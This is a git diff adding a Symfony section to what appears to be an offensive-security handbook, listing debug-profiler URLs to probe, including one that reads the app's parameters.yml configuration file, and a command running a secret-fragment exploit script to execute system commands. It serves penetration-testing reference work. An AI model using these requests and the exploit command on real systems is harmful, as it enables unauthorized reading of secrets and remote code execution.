@@ -54,6 +54,7 @@
 - [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Request-Forgery-SSRF)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Template-Injection-SSTI)
 - [Subdomain Takeover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Subdomain-Takeover)
+- [Symfony](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Symfony)
 - [unfurl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#unfurl)
 - [Upload Vulnerabilities](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Upload-Vulnerabilities)
 - [waybackurls](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#waybackurls)
@@ -3436,6 +3437,28 @@ $ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
 
 ```c
 <!-- PoC by Red Team -->
+```
+
+## Symfony
+
+> https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144
+
+### Enumeration
+
+```c
+http://<RHOST>/_profiler
+http://<RHOST>/app_dev.php/_profiler
+http://<RHOST>/app_dev.php
+http://<RHOST>/app_dev.php/_profiler/phpinfo
+http://<RHOST>/app_dev.php/_profiler/open?file=app/config/parameters.yml
+```
+
+### Exploit
+
+> https://github.com/ambionics/symfony-exploits
+
+```c
+$ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://<RHOST>/_fragment' --function system --parameters 'id'
 ```
 
 ## unfurl
